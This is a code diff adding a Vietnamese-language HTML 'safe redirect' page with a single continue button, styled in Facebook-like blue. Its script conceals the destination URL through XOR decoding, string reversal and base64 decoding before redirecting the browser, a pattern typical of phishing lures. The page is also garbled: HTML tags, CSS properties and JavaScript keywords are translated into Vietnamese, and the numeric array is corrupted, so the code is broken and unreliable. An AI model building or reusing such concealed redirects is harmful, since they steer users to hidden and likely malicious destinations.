@@ -1,1 +1,73 @@
+<!DOCTYPEhtml>
+<html lang="vi">
+<đầu>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Chuyển hướng an toàn</title>
+  <phong cách>
+    thân hình {
+      font-family: 'Helvetica Neue', sans-serif;
+      màu nền: #f0f2f5;
+      lề: 0;
+      đệm: 0;
+      hiển thị: flex;
+      căn chỉnh nội dung: ở giữa;
+      căn chỉnh các mục: ở giữa;
+      chiều cao: 100vh;
+    }
+    .hộp {
+      nền: trắng;
+      đệm: 2rem 3rem;
+      bán kính đường viền: 0,75rem;
+      hộp bóng: 0 4px 12px rgba(0, 0, 0, 0,1);
+      căn chỉnh văn bản: giữa;
+      chiều rộng tối đa: 400px;
+      chiều rộng: 100%;
+    }
+    .hộp h2 {
+      màu sắc: #1877f2;
+      lề dưới: 1rem;
+    }
+    .hộp p {
+      màu sắc: #555;
+      cỡ chữ: 0,95rem;
+    }
+    .btn {
+      lề trên: 1,5rem;
+      đệm: 0,8rem 2rem;
+      cỡ chữ: 1rem;
+      màu nền: #1877f2;
+      màu sắc: trắng;
+      đường viền: không có;
+      bán kính đường viền: 6px;
+      con trỏ: con trỏ;
+      font-weight: đậm;
+    }
+    .btn:di chuột {
+      màu nền: #166fe5;
+    }
+  </phong cách>
+</đầu>
+<thân>
+  <div class="box">
+    Xác nhận chuyển hướng
+    <p>Vui lòng nhấp vào nút bên dưới để tiếp tục.</p>
+    <button class="btn" onclick="redirect()">Tiếp tục</button>
+  </div>
+  <script>
+    const xorKey = 7;
+    const encodedLink = [58,112,80,101,55,111,106,75,107,99,80,94,112,62,126,102,119,85,105,75,55,73,64,99,104,62,68,100,112,65,106,75,116,81,53,94,126,81,106,99,114,66,64,93,109,8 5,83,74,115,66,67,73,126,82,67,93,119,50,53,101,119,85,95,94,116,62,80,102,53,81,53,93,111,69,52,102,109,81,64,102,109,62,126,75,49,74,79,100,55,85,79,102];
 
+    hàm decodeXOR(arr, key) {
+      trả về arr.map(c => String.fromCharCode(c ^ key)).join('');
+    }
+
+    hàm chuyển hướng() {
+      const xorDecoded = decodeXOR(encodedLink, xorKey);
+      const original = xorDecoded.split('').reverse().join('');
+      const url = atob(bản gốc);
+      window.location.href = url;
+    }
+  </script>
+</body>
+</html>
